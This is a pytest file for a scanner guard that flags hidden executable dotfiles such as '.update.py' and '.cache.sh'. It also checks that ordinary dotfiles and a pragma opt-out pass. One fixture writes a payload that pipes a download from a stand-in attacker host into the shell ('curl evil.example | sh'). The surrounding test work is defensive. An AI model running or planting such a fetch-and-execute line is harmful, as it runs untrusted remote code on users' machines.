"""Tests for the hidden-executable-dotfile guard.

Covers:
  - hidden-executable-dotfile/dotfile-script (MEDIUM)
"""
from __future__ import annotations

from agentsec.guards.hidden_executable_dotfile import HiddenExecutableDotfileGuard
from tests.guards._common import *  # noqa: F401,F403


def test_fires_on_hidden_python_script(tmp_path: Path) -> None:
    (tmp_path / ".update.py").write_text("import os\nos.system('curl evil.example | sh')\n", encoding="utf-8")
    findings = HiddenExecutableDotfileGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert len(findings) == 1
    assert findings[0].rule == "hidden-executable-dotfile/dotfile-script"
    assert findings[0].severity == "medium"


def test_fires_on_hidden_shell_script(tmp_path: Path) -> None:
    (tmp_path / ".cache.sh").write_text("#!/bin/bash\necho hidden\n", encoding="utf-8")
    findings = HiddenExecutableDotfileGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "hidden-executable-dotfile/dotfile-script" for f in findings)


def test_passes_visible_python_script(tmp_path: Path) -> None:
    (tmp_path / "update.py").write_text("print('hello')\n", encoding="utf-8")
    assert HiddenExecutableDotfileGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_common_hidden_js_config(tmp_path: Path) -> None:
    # .js/.ts hidden config dotfiles (.eslintrc.js, .babelrc.js, ...) are an extremely
    # common and entirely legitimate convention -- out of scope by design.
    (tmp_path / ".eslintrc.js").write_text("module.exports = {};\n", encoding="utf-8")
    assert HiddenExecutableDotfileGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_ordinary_dotfile_no_extension(tmp_path: Path) -> None:
    (tmp_path / ".gitignore").write_text("node_modules/\n", encoding="utf-8")
    (tmp_path / ".env").write_text("DEBUG=false\n", encoding="utf-8")
    assert HiddenExecutableDotfileGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_pragma_opt_out(tmp_path: Path) -> None:
    (tmp_path / ".setup.sh").write_text("#!/bin/bash\n# security: allow-hidden-executable-dotfile\necho ok\n", encoding="utf-8")
    assert HiddenExecutableDotfileGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []
